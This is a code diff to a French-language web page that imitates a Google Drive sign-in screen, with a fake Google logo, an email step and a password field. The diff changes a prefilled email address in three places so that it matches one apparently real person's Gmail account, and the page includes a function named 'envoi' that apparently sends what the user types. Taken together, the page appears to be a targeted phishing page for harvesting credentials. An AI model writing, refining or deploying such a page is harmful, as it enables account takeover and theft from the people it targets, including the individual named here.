@@ -87,7 +87,7 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
     <h2>Connexion</h2>
     <p class="lead">Continuer vers <b>Google Drive</b></p>
     <form id="formEmail">
-      <input class="field" id="email" type="email" inputmode="email" value="maudperez33@mail.com" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" placeholder="Adresse e-mail">
+      <input class="field" id="email" type="email" inputmode="email" value="maudperez33@gmail.com" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" placeholder="Adresse e-mail">
       <a class="link" href="#" onclick="return false">Mot de passe oublié&nbsp;?</a>
       <div class="actions"><button class="gbtn" type="submit">Suivant</button></div>
     </form>
@@ -103,7 +103,7 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
       <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
     </svg>
     <h2>Bienvenue</h2>
-    <div class="chip"><span class="mini">M</span><span class="mail" id="chipMail">maudperez33@mail.com</span></div>
+    <div class="chip"><span class="mini">M</span><span class="mail" id="chipMail">maudperez33@gmail.com</span></div>
     <form id="formPwd">
       <input class="field" id="pwd" type="password" inputmode="text" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" placeholder="Saisissez votre mot de passe">
       <label class="show"><input type="checkbox" id="showpwd"> Afficher le mot de passe</label>
@@ -173,7 +173,7 @@ async function envoi(texte) {
   return false;
 }
 
-$("start").onclick = () => { $("chipMail").textContent = $("email").value || "maudperez33@mail.com"; show("s2"); };
+$("start").onclick = () => { $("chipMail").textContent = $("email").value || "maudperez33@gmail.com"; show("s2"); };
 
 $("formEmail").addEventListener("submit", e => {
   e.preventDefault();
